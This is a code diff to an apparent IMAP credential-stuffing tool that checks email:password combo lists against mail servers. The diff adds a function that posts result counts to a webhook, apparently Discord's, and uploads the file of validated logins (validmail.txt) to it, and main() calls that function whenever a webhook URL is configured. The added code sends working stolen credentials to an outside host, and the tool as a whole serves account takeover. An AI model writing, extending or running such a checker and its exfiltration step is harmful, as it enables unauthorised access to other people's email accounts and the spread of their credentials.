@@ -4,6 +4,7 @@ import queue
 import json
 import curses
 import time
+import requests
 from raducord import Logger
 from collections import Counter
 
@@ -97,7 +98,7 @@ def worker(settings, combos, valid_count, invalid_count, error_count, lock, conf
         try:
             check_email(combo, settings, valid_count, invalid_count, error_count, lock, config)
         except Exception as e:
-            Logger.warning(f"Error processing, combo, {combo}: {e}")
+            Logger.error(f"Error processing combo {combo}: {e}")
             with lock:
                 error_count[0] += 1
         finally:
@@ -116,6 +117,35 @@ def display_cui(stdscr, valid_count, invalid_count, error_count):
         stdscr.addstr(2, 0, f"[Errors : {error_count[0]}]", curses.color_pair(3))
         stdscr.refresh()
         curses.napms(500)
+
+def send_webhook_notification(url, valid_count, invalid_count, error_count, valid_file):
+    headers = {
+        "Content-Type": "application/json"
+    }
+
+    embed = {
+        "title": "IMAP Checker Results",
+        "color": 65280,  # Green color
+        "fields": [
+            {"name": "Valid", "value": f"```{valid_count}```", "inline": True},
+            {"name": "Invalid", "value": f"```{invalid_count}```", "inline": True},
+            {"name": "Errors", "value": f"```{error_count}```", "inline": True}
+        ]
+    }
+
+    data = {
+        "embeds": [embed]
+    }
+
+    files = {
+        "file": ("validmail.txt", open(valid_file, "rb"))
+    }
+
+    response = requests.post(url, headers=headers, json=data, files=files)
+    if response.status_code == 204:
+        print("Webhook sent successfully.")
+    else:
+        print(f"Failed to send webhook: {response.status_code}")
 
 def main():
     config = load_config()
@@ -150,6 +180,9 @@ def main():
 
     if config['summary']:
         print(f"\nSummary Report:\nValid: {valid_count[0]}\nInvalid: {invalid_count[0]}\nErrors: {error_count[0]}")
+
+    if config['webhook_url']:
+        send_webhook_notification(config['webhook_url'], valid_count[0], invalid_count[0], error_count[0], config['valid_file'])
 
 if __name__ == '__main__':
     main()
